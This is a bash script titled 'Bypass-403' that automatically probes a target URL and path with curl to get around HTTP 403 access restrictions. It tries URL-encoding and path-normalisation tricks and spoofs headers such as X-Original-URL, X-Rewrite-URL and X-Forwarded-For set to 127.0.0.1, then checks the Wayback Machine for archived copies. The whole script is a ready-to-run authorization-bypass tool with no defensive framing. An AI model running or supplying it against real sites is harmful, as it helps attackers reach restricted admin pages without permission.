#! /bin/bash
figlet Bypass-403
echo "                                               By Iam_J0ker"
echo "./bypass-403.sh https://example.com path"
echo " "


# --- Dependency Installation ---
echo "--- Checking and Installing Required Dependencies ---"

# Function to install a package
install_package() {
    local package_name=$1
    echo "Checking for ${package_name}..."
    if command -v "${package_name}" &>/dev/null; then
        echo "${package_name} is already installed."
        clear -x
    else
        echo "${package_name} not found. Attempting to install..."
        if command -v apt &>/dev/null; then
            echo "Detected apt (Debian/Ubuntu). Installing ${package_name}..."
            sudo apt update -qq && sudo apt install -y "${package_name}"
            clear -x
        elif command -v yum &>/dev/null; then
            echo "Detected yum (RedHat/CentOS). Installing ${package_name}..."
            # figlet might be in EPEL, so ensure it's enabled
            if [ "${package_name}" == "figlet" ]; then
                sudo yum install -y epel-release &>/dev/null
            fi
            sudo yum install -y "${package_name}"
        elif command -v brew &>/dev/null; then
            echo "Detected Homebrew (macOS). Installing ${package_name}..."
            brew install "${package_name}"
        else
            echo "Could not detect a common package manager (apt, yum, brew)."
            echo "Please install '${package_name}' manually."
            echo "For figlet: http://www.figlet.org/"
            echo "For jq: https://stedolan.github.io/jq/download/"
            # exit 1 # Exit if a dependency cannot be installed automatically
        fi
        if ! command -v "${package_name}" &>/dev/null; then
            echo "Failed to install ${package_name}. Please install it manually and try again for better result."
            # exit 1
        fi
        echo "${package_name} installed successfully."
        clear -x
    fi
}

# Install figlet
install_package "figlet"

# Install jq
install_package "jq"


echo " "
figlet Bypass-403
echo "                                  By Iam_J0ker"
echo "Usage: ./bypass-403.sh <URL> <PATH>"
echo "Example: ./bypass-403.sh https://example.com secret_admin_panel"
echo " "
echo "======================================================="
echo "--- Testing 403 Bypass Techniques for $1/$2 ---"
echo "======================================================="


curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2
echo "  --> ${1}/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/%2e/$2
echo "  --> ${1}/%2e/${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/.
echo "  --> ${1}/${2}/."
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1//$2//
echo "  --> ${1}//${2}//"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/./$2/./
echo "  --> ${1}/./${2}/./"
# Correct X-Original-URL usage
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: /$2" $1/
echo "  --> ${1}/ -H X-Original-URL: /${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: http://127.0.0.1"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-For: 127.0.0.1:80"
# Correct X-Rewrite-URL usage
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: /$2" $1/
echo "  --> ${1}/ -H X-rewrite-url: /${2}"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%20
echo "  --> ${1}/${2}%20"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2%09
echo "  --> ${1}/${2}%09"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2?
echo "  --> ${1}/${2}?"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.html
echo "  --> ${1}/${2}.html"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/?anything
echo "  --> ${1}/${2}/?anything"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2#
echo "  --> ${1}/${2}#"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $1/$2
echo "  --> ${1}/${2} -H Content-Length:0 -X POST"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2/*
echo "  --> ${1}/${2}/*"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.php
echo "  --> ${1}/${2}.php"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $1/$2.json
echo "  --> ${1}/${2}.json"
curl -k -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $1/$2
echo "  --> ${1}/${2}  -X TRACE"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Host: 127.0.0.1"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" "$1/$2..;/"
echo "  --> ${1}/${2}..;/"
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" " $1/$2;/"
echo "  --> ${1}/${2};/"
#updated
#Removed Trace as it's used twice
curl -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $1/$2
echo "  --> ${1}/${2} -H X-Forwarded-Host: 127.0.0.1"
echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$1/$2 | jq -r '.archived_snapshots.closest | {available, url}'

